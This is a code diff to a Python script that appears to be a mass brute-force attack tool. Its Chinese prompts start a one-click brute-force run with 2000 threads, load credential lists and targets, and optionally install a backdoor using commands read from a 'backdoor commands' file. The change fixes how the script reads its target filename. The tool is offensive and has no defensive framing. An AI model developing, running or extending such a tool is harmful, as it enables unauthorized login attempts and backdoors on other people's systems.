@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# Final Version: Bugfix for NameError + Pre-processing + Max Speed
+# Final Version: Input Bugfix + Pre-processing + Max Speed
 import os
 import subprocess
 import time
@@ -563,6 +563,10 @@ def input_with_default(prompt, default):
     val = input(f"{prompt}（默认 {default}）：").strip()
     return int(val) if val.isdigit() else default
 
+def input_filename_with_default(prompt, default):
+    user_input = input(f"{prompt}（默认 {default}）：").strip()
+    return user_input if user_input else default
+
 def to_go_string_array(items: list) -> str:
     if not items: return "[]string{}"
     escaped = [item.replace("\\", "\\\\").replace('"', '\\"') for item in items]
@@ -708,9 +712,6 @@ func main() {
 }
 '''
     logic_part = "package main\n" + template_content.split("package main")[1]
-    
-    # *** BUG FIX aPPLIED HERE ***
-    # Correctly split and join the Go code template
     parts = logic_part.split("import (")
     final_code = parts[0] + COMMON_LOGIC + "import (".join(parts[1:])
 
@@ -824,8 +825,8 @@ if __name__ == "__main__":
             kwargs["install_backdoor"] = True
             with open("后门命令.txt", encoding='utf-8') as f: kwargs["custom_cmds"] = [l.strip() for l in f if l.strip()]
         print("\n=== 爆破一键启动 ===")
-        input_file = input_with_default("请输入源文件名", "1.txt") # Corrected function name
-        cleaned_input_file = preprocess_list(str(input_file), "cleaned_targets.txt")
+        input_file = input_filename_with_default("请输入源文件名", "1.txt")
+        cleaned_input_file = preprocess_list(input_file, "cleaned_targets.txt")
         semaphore_size = input_with_default("爆破线程数", 2000)
         timeout = input_with_default("网络超时秒数", 8)
         usernames, passwords = load_credentials(TEMPLATE_MODE)
